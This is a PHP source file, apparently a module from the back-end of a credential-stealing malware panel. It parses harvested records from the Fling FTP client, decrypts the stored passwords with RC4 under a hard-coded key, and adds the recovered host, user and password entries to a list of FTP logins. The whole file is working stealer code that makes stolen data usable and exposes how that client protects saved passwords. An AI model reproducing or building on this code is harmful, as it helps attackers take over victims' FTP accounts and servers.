<?php
//ok
	class Module_fling extends Module_
	{
		private function Decrypt($Password)
		{
			if (strlen($Password) == 0)
				return '';
			
			$KEY_ = substr(md5('nchkqxllib', true), 0, 5)."\0\0\0\0\0\0\0\0\0\0\0";

			return RC4__($KEY_, $Password);
		}
	
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				$stream = new Stream($Data);
				while(TRUE)
				{
					$User	= $stream->getSTRING_();
					if($User == NULL)
						break;

					$Host 	= $stream->getSTRING_();
					$Pass1	= $stream->getSTRING_();
					$Pass2	= $stream->getBINARY_();
					
					if (strlen($Pass1))
						$this->add_ftp($Host, $User, $Pass1);

					if (strlen($Pass2))
					{
						$Pass2 = $this->Decrypt($Pass2);
						$this->add_ftp($Host, $User, $Pass2);
					}
				}
				$stream = NULL;
					break;
				default:
					return FALSE;
			}
			
			return TRUE;
		}
	}